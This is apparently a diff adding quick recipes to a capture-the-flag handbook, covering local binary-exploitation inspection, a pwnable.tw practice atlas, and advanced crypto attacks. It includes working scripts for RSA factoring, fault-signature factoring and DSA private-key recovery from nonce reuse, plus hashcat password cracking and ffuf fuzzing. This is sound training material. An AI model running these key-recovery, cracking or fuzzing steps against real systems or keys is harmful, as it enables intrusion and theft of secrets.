+rabin2 -I "$FILE"
+rabin2 -i "$FILE"
+checksec --help
+checksec --file="$FILE"
+```
+
+**Look for:** architecture, PIE, NX, canary, RELRO and input functions.
+**If not:** when help lists subcommands, use `checksec file "$FILE"` ([versions](https://github.com/slimm609/checksec)); WSL fallback: `objdump -x "$FILE"`.
+
+<a id="08-binary-exploitation--quick-send-exact-local-input-bytes"></a>
+
+## Quick: send exact local input bytes
+
+**Windows WSL · Bash/Python; compatible local ELF.**
+
+```bash
+read -r -p 'Local executable path: ' FILE
+python3 - "$FILE" <<'PY'
+import subprocess, sys
+from pathlib import Path
+target = str(Path(sys.argv[1]).resolve())
+payload = b'AAAA\n'
+Path('input.bin').write_bytes(payload)
+try:
+    r = subprocess.run([target], input=payload, capture_output=True, timeout=3)
+    print('exit:', r.returncode, 'stdout:', repr(r.stdout), 'stderr:', repr(r.stderr))
+except subprocess.TimeoutExpired as e:
+    print('timeout; partial output:', repr(e.stdout))
+PY
+```
+
+**Look for:** stable prompt/output and whether input needs a newline.
+**If not:** inspect arguments, working directory, loader and protocol before enlarging input.
+
+<a id="08-binary-exploitation--quick-measure-the-crashing-input"></a>
+
+## Quick: measure the crashing input
+
+**Windows WSL · Bash**, then **GDB**.
+
+```bash
+read -r -p 'Local ELF path: ' FILE
+python3 recipes/pattern.py --length 512
+gdb -nx -q "$FILE"
+```
+
+```text
+run < pattern.bin
+info registers
+x/i $pc
+x/32bx $sp
+bt
+```
+
+**Look for:** four bytes from the actual overwritten control slot, in increasing memory-address order. x86-64 can fault at `ret` before RIP changes.
+**If not:** inspect the pending return slot; a crash elsewhere does not establish return control.
+
+<a id="08-binary-exploitation--quick-verify-the-offset-and-byte-order"></a>
+
+## Quick: verify the offset and byte order
+
+**Windows WSL · Bash; use [the pattern file actually sent](#08-binary-exploitation--quick-measure-the-crashing-input).**
+
+```bash
+read -r -p 'Four memory-order bytes, eight hex digits: ' CRASH_HEX
+python3 recipes/pattern.py --find "$CRASH_HEX" --sent pattern.bin
+```
+
+```bash
+read -r -p 'Measured offset (decimal): ' OFFSET
+read -r -p 'Pointer width (4 or 8 bytes): ' WIDTH
+python3 - "$OFFSET" "$WIDTH" <<'PY'
+from pathlib import Path
+import sys
+offset, width = map(int, sys.argv[1:])
+assert 0 <= offset <= 4096 and width in (4, 8)
+Path('marker.bin').write_bytes(b'A'*offset + b'BCDEFGHI'[:width])
+PY
+```
+
+**Look for:** marker bytes at the saved control slot when stopped before return.
+**If not:** remeasure. Pattern membership does **not** confirm byte order: reversed bytes may also match. Verify with a byte dump, not a register integer.
+
+<a id="08-binary-exploitation--quick-inspect-the-overwrite-before-return"></a>
+
+## Quick: inspect the overwrite before return
+
+**Windows WSL · Bash**, then **GDB; compatible x86 ELF**. First [create marker.bin](#08-binary-exploitation--quick-verify-the-offset-and-byte-order).
+
+```bash
+read -r -p 'Local ELF path: ' FILE
+gdb -nx -q "$FILE"
+```
+
+```text
+set disassembly-flavor intel
+start < marker.bin
+info proc mappings
+disassemble /r main
+```
+
+**Look for:** vulnerable function's return instruction. Set `break *` followed by its current address, then `continue`; inspect the slot using `x/16bx $sp`.
+**If not:** locate the function via Ghidra; PIE addresses must match the current run.
+
+<a id="08-binary-exploitation--quick-inspect-a-useful-function-and-gadgets"></a>
+
+## Quick: inspect a useful function and gadgets
+
+**Kali · Bash**
+
+```bash
+read -r -p 'Local ELF path: ' FILE
+r2 -q -c 'aaa;afl~win;pdf @ sym.win' "$FILE"
+ROPgadget --binary "$FILE" --only 'pop|ret' > gadgets.txt
+rg 'pop rdi|pop rsi|pop rdx|ret$' gadgets.txt
+```
+
+**Look for:** required arguments, extra pops, stack alignment and relocated addresses.
+**If not:** follow success-string references; a function name or gadget list does not prove a usable chain.
+
+<a id="08-binary-exploitation--quick-trace-allocation-ownership"></a>
+
+## Quick: trace allocation ownership
+
+**Windows WSL · Linux x86-64; Bash**, then **GDB**.
+
+```bash
+read -r -p 'Local ELF path: ' FILE
+gdb -nx -q "$FILE" -ex 'break malloc' -ex 'break free' -ex run
+```
+
+```text
+bt
+info registers rdi
+finish
+info registers rax
+```
+
+**Look for:** malloc size in RDI and returned pointer in RAX; free receives a pointer in RDI. Record owner, allocation and free order.
+**If not:** narrow breakpoints to the application's callers; use the supplied libc's layout.
+
+<a id="08-binary-exploitation--quick-identify-syscall-restrictions"></a>
+
+## Quick: identify syscall restrictions
+
+**Kali · Bash; executes the selected local binary.**
+
+```bash
+read -r -p 'Executable path (include ./ or use absolute): ' FILE
+strace -f -o trace.log -e trace=prctl,seccomp,openat,read,write "$FILE"
+rg -n 'seccomp|prctl|SIGSYS|EPERM|ENOSYS' trace.log
+```
+
+**Look for:** denied operations and actual file descriptors/read counts.
+**If not:** decode the filter from source/disassembly; a trace covers only attempted syscalls.
+
+<a id="08-binary-exploitation--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="08-binary-exploitation--binary-exploitation-prove-the-primitive-then-build-the-chain"></a>
 
@@ -6260,10 +8119,198 @@ Before calling a solve repeatable, start from a fresh local process, rebuild onl
 
 Source map: `ctf-pwn/SKILL.md`, `ctf-pwn/attack-playbook.md`, `ctf-pwn/static-signals.md`, `ctf-pwn/overflow-basics.md`, `ctf-pwn/rop-and-shellcode.md`, `ctf-pwn/rop-advanced.md`, `ctf-pwn/format-string.md`, `ctf-pwn/heap-techniques.md`, `ctf-pwn/heap-techniques-2.md`, `ctf-pwn/heap-fsop.md`, `ctf-pwn/advanced.md`, `ctf-pwn/advanced-exploits.md`, `ctf-pwn/advanced-exploits-2.md`, `ctf-pwn/advanced-exploits-3.md`, `ctf-pwn/advanced-exploits-4.md`, `ctf-pwn/advanced-exploits-5.md`, `ctf-pwn/sandbox-escape.md`, `ctf-pwn/kernel.md`, `ctf-pwn/kernel-techniques.md`, `ctf-pwn/kernel-bypass.md`, and `ctf-pwn/field-notes.md`. Detailed case-specific payloads remain historical source material; advanced AI/ML, unapproved-tool, and external-target workflows are not competition instructions.
 
+</details>
+
 
 ---
 
 <a id="13-pwn-practice-atlas"></a>
+
+<a id="13-pwn-practice-atlas--pwn-practice-atlas"></a>
+
+# Pwn practice atlas
+
+Use supplied local practice artifacts; [event rules](#competition). Historical claims need verification against your binary/runtime. All 43 case explanations remain in Full reference. [Offset workflow](#08-binary-exploitation--quick-measure-the-crashing-input).
+
+<a id="13-pwn-practice-atlas--quick-inventory-one-exercise"></a>
+
+## Quick: inventory one exercise
+
+**Kali · Bash**
+
+```bash
+read -r -p 'Local exercise binary path: ' FILE
+file "$FILE"
+rabin2 -I "$FILE"
+rabin2 -i "$FILE"
+rabin2 -R "$FILE"
+```
+
+**Look for:** architecture, imports, relocation targets and supplied runtime files.
+**If not:** recover the matching artifact first; old addresses are not measurements.
+
+<a id="13-pwn-practice-atlas--quick-inspect-a-control-or-index-primitive"></a>
+
+## Quick: inspect a control or index primitive
+
+**Kali · Bash**, then **radare2** ([commands](https://book.rada.re/refcard/intro.html)).
+
+| Cases | First checkpoint |
+| --- | --- |
+| start, calc, silver_bullet, dubblesort | Read size, index/length change, sorting |
+| 3x17, starbound, babystack | Reentry, dispatch index, stale input |
+| unexploitable, de_aslr, printable | Missing output and usable existing pointers |
+
+```bash
+read -r -p 'Local exercise binary path: ' FILE
+r2 "$FILE"
+```
+
+```text
+aaa
+ii
+afl
+pdf @ main
+```
+
+**Look for:** one controlled value reaching one later consumer.
+**If not:** select a discovered function with `pdf @` plus its exact name; inspect the parser before a long chain.
+
+<a id="13-pwn-practice-atlas--quick-check-constrained-code-and-descriptors"></a>
+
+## Quick: check constrained code and descriptors
+
+**Kali · Bash**
+
+| Cases | First checkpoint |
+| --- | --- |
+| orw, kidding | Permitted syscalls and open descriptors |
+| death_note, alive_note, mno2 | Validator, byte limits and fragment boundaries |
+
+```bash
+read -r -p 'Local executable path (include ./ or use absolute): ' FILE
+strace -f -o descriptors.log -e trace=close,read,write,openat,prctl,seccomp "$FILE"
+```
+
+**Windows WSL · raw x86 shellcode inspection**
+
+```bash
+read -r -p 'Raw payload file: ' FILE
+xxd "$FILE"
+objdump -D -b binary -m i386 -M intel "$FILE"
+```
+
+**Look for:** valid instruction boundaries and live descriptors; use `-m i386:x86-64` only for 64-bit code.
+**If not:** reproduce the exact validator. Printable bytes alone do not satisfy `mno2`'s grammar.
+
+<a id="13-pwn-practice-atlas--quick-prove-an-object-outlives-its-storage"></a>
+
+## Quick: prove an object outlives its storage
+
+**Windows WSL · compatible Linux x86-64 ELF; Bash**, then **GDB**.
+
+| Cases | First checkpoint |
+| --- | --- |
+| hacknote, secret_garden, tcache_tear, heap_paradise | Stale pointer and actual reuse |
+| secret_of_my_heart, bookwriter, spirited_away | Changed size/terminator boundary |
+| applestore, re_alloc, re_alloc_revenge, break_out | Owner survives free or return |
+| caov, ghost_party, food_store, babyallocator | Destruction, initialization or segment metadata |
+
+```bash
+read -r -p 'Local ELF path: ' FILE
+gdb -nx -q "$FILE" -ex 'break free' -ex run
+```
+
+```text
+bt
+info registers rdi
+x/4gx $rdi
+```
+
+**Look for:** the freed address still reachable through an application object; RDI applies to x86-64.
+**If not:** trace allocation and slot clearing; `re_alloc`'s historical description is contradictory.
+
+<a id="13-pwn-practice-atlas--quick-inspect-file-and-library-state"></a>
+
+## Quick: inspect FILE and library state
+
+**Kali · static Bash inspection**
+
+| Cases | First checkpoint |
+| --- | --- |
+| seethefile, wannaheap | Next FILE consumer and two size variables |
+| criticalheap, criticalheap_pp | Format sink or resolved-path write length |
+| bounty_program_a, bounty_program_b | Retained strtok pointer and delimiter write |
+
+```bash
+read -r -p 'Local exercise binary path: ' FILE
+rabin2 -i "$FILE" > imports.txt
+rg 'fclose|fread|fwrite|printf|realpath|strtok|localtime' imports.txt
+```
+
+**Look for:** the exact state consumed by the next call.
+**If not:** inspect static functions; old FILE layouts require their matching libc.
+
+<a id="13-pwn-practice-atlas--quick-test-parser-state-before-exploitation"></a>
+
+## Quick: test parser state before exploitation
+
+**Windows WSL · Bash; inspect a supplied ELF.**
+
+| Cases | First checkpoint |
+| --- | --- |
+| hitcon_ftp, seccomptools | Type/length validation or evaluator disagreement |
+| stupid_boss, digimon, omegago | Field layout, tokenization or history growth |
+
+```bash
+read -r -p 'Local ELF path: ' FILE
+objdump -d -M intel "$FILE" > exercise.asm
+strings -a -t x "$FILE" > exercise.strings
+```
+
+**Look for:** the first mismatched width, type, bound or state transition.
+**If not:** record one valid input and change one field; several catalog summaries disagree with detailed cases.
+
+<a id="13-pwn-practice-atlas--quick-inspect-a-historical-shell-artifact"></a>
+
+## Quick: inspect a historical shell artifact
+
+**Windows WSL · static only; bash and bash_revenge cases.**
+
+```bash
+read -r -p 'Supplied historical shell binary path: ' FILE
+objdump -f "$FILE"
+strings -a "$FILE" > shell-strings.txt
+```
+
+**Look for:** exact build, builtin and allocator assumptions in the supplied lab.
+**If not:** stop at static analysis; the workstation shell is not that practice image.
+
+<a id="13-pwn-practice-atlas--quick-save-a-reproducible-checkpoint"></a>
+
+## Quick: save a reproducible checkpoint
+
+**Windows WSL · Bash/Python**
+
+```bash
+read -r -p 'Artifact to fingerprint: ' FILE
+python3 - "$FILE" <<'PY'
+import hashlib, sys
+from pathlib import Path
+p = Path(sys.argv[1])
+print(p.name, hashlib.sha256(p.read_bytes()).hexdigest())
+PY
+```
+
+**Look for:** saved input, binary/libc hashes, first primitive, observed trigger and one failed assumption.
+**If not:** repeat from a fresh local process before retaining an exploit claim.
+
+<a id="13-pwn-practice-atlas--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="13-pwn-practice-atlas--pwn-practice-atlas-43-cases-each-with-a-specific-lesson"></a>
 
@@ -6753,10 +8800,221 @@ Write five short items: the initial bug, the first reliable primitive, the missi
 
 The source directory index, `ctf-pwn/pwnable-tw/README.md`, is preserved as a historical catalog. Its entries for `re_alloc`, `de_aslr`, `food_store`, `hitcon_ftp`, `seccomptools`, `stupid_boss`, `digimon`, `omegago`, and related advanced cases require comparison with the individual files and actual binary. The atlas favors concrete per-case observations and explicitly leaves unverified exploit claims unverified.
 
+</details>
+
 
 ---
 
 <a id="14-advanced-crypto"></a>
+
+<a id="14-advanced-crypto--advanced-cryptography"></a>
+
+# Advanced cryptography
+
+Use after [basic crypto](#07-cryptography). Set `FILE` to your supplied parameters. JSON examples below use decimal integers, not hexadecimal strings. [Full reference](#14-advanced-crypto--full-reference) preserves complete lattice, GF(2), LFSR, sharing, proof-system and algebra explanations.
+
+<a id="14-advanced-crypto--quick-test-an-unusually-small-rsa-private-exponent"></a>
+
+## Quick: test an unusually small RSA private exponent
+
+**WSL · Python 3.** Input: `rsa.json` containing `n`, `e`. Wiener works only under small-private-exponent assumptions.
+
+```bash
+FILE='rsa.json'
+python3 - "$FILE" <<'PY'
+import json, sys
+from pathlib import Path
+from math import isqrt
+v = json.loads(Path(sys.argv[1]).read_text()); n, e = v['n'], v['e']
+a, b, p0, p1, q0, q1 = e, n, 0, 1, 1, 0
+while b:
+    t, r = divmod(a, b); a, b = b, r
+    p0, p1 = p1, t*p1+p0; q0, q1 = q1, t*q1+q0
+    k, d = p1, q1
+    if not k or (e*d-1) % k: continue
+    phi = (e*d-1)//k; s = n-phi+1; delta = s*s-4*n
+    if delta < 0: continue
+    root = isqrt(delta)
+    if root*root != delta or (s+root) % 2: continue
+    p, q = (s+root)//2, (s-root)//2
+    if p > 1 and q > 1 and p*q == n:
+        print('d', d, 'p', p, 'q', q); break
+else: print('No verified Wiener candidate')
+PY
+```
+
+**Look for:** factors whose product equals `n`; decrypt/re-encrypt with the basic recipe.
+**If not:** inspect key generation; failure does not establish secure parameters.
+
+<a id="14-advanced-crypto--quick-try-bounded-local-p-minus-one-factoring"></a>
+
+## Quick: try bounded local p-minus-one factoring
+
+**WSL · Python 3.** Input: `rsa.json` containing `n`. Bound 10,000 is a deliberate time limit.
+
+```bash
+FILE='rsa.json'
+python3 - "$FILE" <<'PY'
+import json, sys
+from pathlib import Path
+from math import gcd
+n = json.loads(Path(sys.argv[1]).read_text())['n']; a = 2
+for j in range(2, 10001):
+    a = pow(a, j, n); p = gcd(a-1, n)
+    if 1 < p < n:
+        print('p', p, 'q', n//p); break
+    if p == n:
+        print('Both factors reached; change model/base'); break
+else: print('No factor within bound')
+PY
+```
+
+**Look for:** a proper factor when a prime's predecessor is smooth.
+**If not:** stop expanding blindly; inspect another structural weakness.
+
+<a id="14-advanced-crypto--quick-factor-from-a-faulty-rsa-signature"></a>
+
+## Quick: factor from a faulty RSA signature
+
+**WSL · Python 3.** Input JSON: `n`, `e`, `signature`, `m`; `m` is the encoded integer being signed, including any hashing/padding.
+
+```bash
+FILE='fault.json'
+python3 - "$FILE" <<'PY'
+import json, sys
+from pathlib import Path
+from math import gcd
+v = json.loads(Path(sys.argv[1]).read_text()); n = v['n']
+p = gcd(pow(v['signature'], v['e'], n)-v['m'], n)
+print(('p', p, 'q', n//p) if 1 < p < n else 'No proper factor')
+PY
+```
+
+**Look for:** one correct CRT residue exposing a proper factor.
+**If not:** check message encoding and whether the fault preserves either residue.
+
+<a id="14-advanced-crypto--quick-recover-a-candidate-hidden-rsa-modulus"></a>
+
+## Quick: recover a candidate hidden RSA modulus
+
+**WSL · Python 3.** Input JSON: `e`, `pairs` containing `[message_integer,ciphertext_integer]` rows. Use at least two known pairs; bounds prevent huge unreduced powers.
+
+```bash
+FILE='samples.json'
+python3 - "$FILE" <<'PY'
+import json, sys
+from pathlib import Path
+from math import gcd
+v = json.loads(Path(sys.argv[1]).read_text()); e, pairs = v['e'], v['pairs']
+assert 2 <= e <= 17 and len(pairs) >= 2
+candidate = 0
+for m, c in pairs:
+    assert m >= 0 and c >= 0 and m.bit_length() <= 8192
+    candidate = gcd(candidate, abs(m**e-c))
+if candidate > max(c for m,c in pairs):
+    print('candidate, possibly a multiple of n:', candidate)
+    print('all samples fit:', all(pow(m,e,candidate) == c for m,c in pairs))
+else: print('No usable modulus candidate')
+PY
+```
+
+**Look for:** a candidate explaining every sample.
+**If not:** verify textbook RSA assumptions; collect independent pairs to reduce multiples.
+
+<a id="14-advanced-crypto--quick-test-a-genuinely-small-discrete-log-range"></a>
+
+## Quick: test a genuinely small discrete-log range
+
+**WSL · Python 3.** Input JSON: prime `p`, generator/base `g`, target `h`, inclusive exponent `bound` no larger than 1,000,000.
+
+```bash
+FILE='dlog.json'
+python3 - "$FILE" <<'PY'
+import json, sys
+from pathlib import Path
+v = json.loads(Path(sys.argv[1]).read_text())
+p,g,h,bound = (v[k] for k in ('p','g','h','bound'))
+assert p > 2 and 0 < g < p and 0 < h < p and 0 <= bound <= 1000000
+value = 1
+for x in range(bound+1):
+    if value == h:
+        assert pow(g,x,p) == h
+        print('verified exponent', x); break
+    value = value*g % p
+else: print('No exponent in the stated range')
+PY
+```
+
+**Look for:** an exponent verified by modular exponentiation.
+**If not:** use the reference's bounded baby-step/giant-step or subgroup analysis.
+
+<a id="14-advanced-crypto--quick-check-supplied-elliptic-curve-points"></a>
+
+## Quick: check supplied elliptic-curve points
+
+**WSL · Python 3.** Input JSON: prime `p`, coefficients `a`,`b`, and finite `points` containing `[x,y]` rows for `y² = x³ + ax + b`.
+
+```bash
+FILE='curve.json'
+python3 - "$FILE" <<'PY'
+import json, sys
+from pathlib import Path
+v = json.loads(Path(sys.argv[1]).read_text()); p,a,b = (v[k] for k in ('p','a','b'))
+assert p > 3
+print('nonsingular:', (4*a**3+27*b**2) % p != 0)
+for i, (x,y) in enumerate(v['points']):
+    print(i, 'canonical:', 0 <= x < p and 0 <= y < p,
+          'on curve:', (y*y-x*x*x-a*x-b) % p == 0)
+PY
+```
+
+**Look for:** singular parameters or missing point validation in the challenge source.
+**If not:** membership alone proves neither subgroup order nor nonce safety.
+
+<a id="14-advanced-crypto--quick-recover-a-repeated-nonce-dsa-candidate"></a>
+
+## Quick: recover a repeated-nonce DSA candidate
+
+**WSL · Python 3.** Input JSON: prime subgroup `q`, repeated `r`, signatures `s1`,`s2`, message-hash integers `h1`,`h2` reduced as the signer does. Assumes the same key and exact same nonce.
+
+```bash
+FILE='signatures.json'
+python3 - "$FILE" <<'PY'
+import json, sys
+from pathlib import Path
+v = json.loads(Path(sys.argv[1]).read_text())
+q,r,s1,s2,h1,h2 = (v[k] for k in ('q','r','s1','s2','h1','h2'))
+k = (h1-h2)*pow((s1-s2) % q,-1,q) % q
+x = (s1*k-h1)*pow(r,-1,q) % q
+assert (s1*k-h1-x*r) % q == (s2*k-h2-x*r) % q == 0
+print('nonce candidate', k, 'private-key candidate', x)
+PY
+```
+
+**Look for:** a candidate matching the public key and validating both original signatures.
+**If not:** check hash reduction, nonce assumptions and inverse failures; algebra alone is insufficient.
+
+<a id="14-advanced-crypto--quick-locate-the-matching-advanced-implementation"></a>
+
+## Quick: locate the matching advanced implementation
+
+**Kali · ripgrep / crypto-attacks checkout.** Read assumptions and function signatures before choosing dependencies; this block does not run attacks.
+
+```bash
+DIR='/opt/tools/crypto-attacks'
+rg --files "$DIR" | rg 'hidden_number|lwe|coppersmith|knapsack|lcg|shamir|wiener'
+rg -n '^def |^from |^import ' "$DIR/attacks/rsa/wiener.py"
+```
+
+**Look for:** the exact equation, unknown bounds, input format and verification condition.
+**If not:** use the full reference to build the model; a missing dependency is not a reason to upload parameters online.
+
+<a id="14-advanced-crypto--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="14-advanced-crypto--advanced-cryptography-choose-a-model-you-can-verify"></a>
 
@@ -7253,6 +9511,8 @@ For image shifts, grid permutations, and Arnold-cat-map scrambling, preserve dim
 Stop an attack branch when its required structure is absent, its query budget exceeds the challenge limit, or a small known-secret instance fails. Record the failed condition. Continue with a different mathematically supported branch rather than increasing concurrency or switching to prohibited online analysis.
 
 Before accepting a result, validate it outside the solver: re-encrypt, recompute signatures, regenerate outputs, satisfy the original polynomial equations, or run the challenge's local checker. A lattice vector, SMT model, root, or decoded string is only a candidate until it passes that check.
+
+</details>
 
 
 ---
@@ -8684,6 +10944,8 @@ hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
 
 # 80,443 http
 
+**Editor correction:** directory fuzzing varies the URL path. The copied Host-header example and fixed response-size filter were corrected below; compare candidates with a missing-path response. The original vault snapshot is unchanged.
+
 
 - Check URL address for clues such as .html .php
 - Ctrl-U and check source for further clues like comments or file extensions
@@ -8707,7 +10969,9 @@ sudo nmap -p80 --script=http-enum 192.168.50.20
 ```bash
 gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
 
-ffuf -u http://siteisup.htb -H "Host: siteisup.htb/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 1131
+URL='http://challenge.example'  # replace with the challenge URL
+printf '%s\n' admin api backup export > words.txt
+ffuf -u "$URL/FUZZ" -w words.txt -mc all -ac -t 1 -rate 1 -maxtime 30
 ```
 
 <a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--subdomain-enumeration"></a>
